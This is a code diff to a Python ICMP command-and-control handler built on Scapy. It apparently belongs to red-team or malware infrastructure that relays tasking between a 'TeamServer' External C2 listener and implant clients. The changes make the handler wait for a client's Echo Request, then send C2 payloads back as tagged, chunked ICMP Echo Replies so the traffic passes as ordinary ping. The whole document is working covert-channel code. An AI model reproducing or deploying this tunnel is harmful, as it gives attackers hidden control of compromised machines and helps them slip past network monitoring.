@@ -88,7 +88,7 @@ class ICMP_C2_Handler:
                     print("[+] Sending reply to client...")
                     #reply = IP(dst=ip_src, src=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=response_payload)
                     #send(reply, verbose=False)
-                    self.send_fragmented_icmp(ip_dst=ip_src, icmp_id=icmp_id, full_payload=response_payload)
+                    self.send_fragmented_icmp(client_ip=ip_src, client_icmp_id=icmp_id, full_payload=response_payload)
                     print(f"[+] Replied to {ip_src} with C2 payload")
 
                 # === Forward other traffic to TeamServer ===
@@ -108,13 +108,13 @@ class ICMP_C2_Handler:
 
     # for large frames/payloads
     def send_icmp_packet(self, ip_dst, icmp_id, icmp_seq, payload, tag=b"RQ47"):
-        from scapy.all import IP, ICMP, Raw, send
-
-        # Prefix payload with tag
+        """
+        Always send as an Echo Reply (type 0).
+        """
         full_payload = tag + payload
-        packet = IP(dst=ip_dst) / ICMP(type=8, id=icmp_id, seq=icmp_seq) / Raw(load=full_payload)
+        packet = IP(dst=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=full_payload)
         send(packet, verbose=False)
-        print(f"[+] Sent ICMP packet seq={icmp_seq}, len={len(full_payload)}")
+        print(f"[+] Sent ICMP REPLY seq={icmp_seq}, len={len(full_payload)}")
 
 
     # def send_fragmented_icmp(self, ip_dst, icmp_id, full_payload, tag=b"RQ47", chunk_size=500):
@@ -132,25 +132,89 @@ class ICMP_C2_Handler:
     #         offset += chunk_size
     #         seq += 1
 
-    def send_fragmented_icmp(self, ip_dst, icmp_id, full_payload, tag=b"RQ47"):
-        # Only raw “payload” here—do NOT pre‐prefix with tag
-        # Compute how much real data fits per ICMP packet:
-        chunk_data_size = 500 - len(tag)  # 500 comes from ICMP_PAYLOAD_SIZE in client.c
+    # def send_fragmented_icmp(self, ip_dst, icmp_id, full_payload, tag=b"RQ47"):
+    #     # Only raw “payload” here—do NOT pre‐prefix with tag
+    #     # Compute how much real data fits per ICMP packet:
+    #     chunk_data_size = 500 - len(tag)  # 500 comes from ICMP_PAYLOAD_SIZE in client.c
 
-        # 1) Sequence 0: just send the total‐size (4 bytes), letting send_icmp_packet prefix tag
-        total_size = len(full_payload)
-        size_bytes = total_size.to_bytes(4, "big")
-        self.send_icmp_packet(ip_dst, icmp_id, 0, size_bytes, tag=tag)
+    #     # 1) Sequence 0: just send the total‐size (4 bytes), letting send_icmp_packet prefix tag
+    #     total_size = len(full_payload)
+    #     size_bytes = total_size.to_bytes(4, "big")
+    #     self.send_icmp_packet(ip_dst, icmp_id, 0, size_bytes, tag=tag)
 
-        # 2) Now send “full_payload” in 496-byte slices:
+    #     # 2) Now send “full_payload” in 496-byte slices:
+    #     offset = 0
+    #     seq = 1
+    #     while offset < total_size:
+    #         chunk = full_payload[offset : offset + chunk_data_size]
+    #         # send_icmp_packet will emit: [TAG (4 bytes)] + chunk
+    #         self.send_icmp_packet(ip_dst, icmp_id, seq, chunk, tag=tag)
+    #         offset += chunk_data_size
+    #         seq += 1
+
+    def wait_for_echo_request(self, expected_src_ip, expected_icmp_id=None):
+        """
+        Block until we see an ICMP Echo Request (type=8) from expected_src_ip.
+        If expected_icmp_id is provided, also match on ICMP.id.
+        Returns the full Scapy packet.
+        """
+        # Build a filter function that checks for:
+        #   - IP.src == expected_src_ip
+        #   - ICMP.type == 8 (Echo Request)
+        #   - optionally ICMP.id == expected_icmp_id
+        def _pkt_filter(pkt):
+            if IP not in pkt or ICMP not in pkt:
+                return False
+            if pkt[IP].src != expected_src_ip:
+                return False
+            if pkt[ICMP].type != 8:  # 8 == Echo Request
+                return False
+            if expected_icmp_id is not None and pkt[ICMP].id != expected_icmp_id:
+                return False
+            return True
+
+        # This will block until one packet arrives that passes _pkt_filter
+        found = sniff(lfilter=_pkt_filter, count=1, timeout=None)
+        if not found:
+            return None
+        return found[0]  # first (and only) packet
+
+    def send_fragmented_icmp(self, client_ip, client_icmp_id, full_payload, tag=b"RQ47"):
+        """
+        Fragment 'full_payload' into (500 − len(tag))‐byte chunks,
+        but only AFTER blocking until the client sends us a request.
+        """
+        # First: wait for the client to issue an Echo Request on this ID.
+        print(f"[*] Waiting for Echo Request from {client_ip} (ICMP ID={client_icmp_id}) …")
+        req_pkt = self.wait_for_echo_request(expected_src_ip=client_ip,
+                                             expected_icmp_id=client_icmp_id)
+        if req_pkt is None:
+            print("[-] Timed out waiting for client request.")
+            return
+
+        # Now we've seen the client's check-in. We can respond.
+        # 1) Send seq = 0 reply containing total_size (4 bytes)
+        total_size  = len(full_payload)
+        size_bytes  = total_size.to_bytes(4, "big")
+        self.send_icmp_packet(ip_dst=client_ip,
+                              icmp_id=client_icmp_id,
+                              icmp_seq=0,
+                              payload=size_bytes,
+                              tag=tag)
+
+        # 2) Send actual data in 496-byte chunks (because ICMP_PAYLOAD_SIZE=500)
+        chunk_data_size = 500 - len(tag)
         offset = 0
-        seq = 1
+        seq    = 1
         while offset < total_size:
             chunk = full_payload[offset : offset + chunk_data_size]
-            # send_icmp_packet will emit: [TAG (4 bytes)] + chunk
-            self.send_icmp_packet(ip_dst, icmp_id, seq, chunk, tag=tag)
+            self.send_icmp_packet(ip_dst=client_ip,
+                                  icmp_id=client_icmp_id,
+                                  icmp_seq=seq,
+                                  payload=chunk,
+                                  tag=tag)
             offset += chunk_data_size
-            seq += 1
+            seq    += 1
 
     def go(self):
         print("[+] Attempting to connect to TeamServer External C2 Listener")
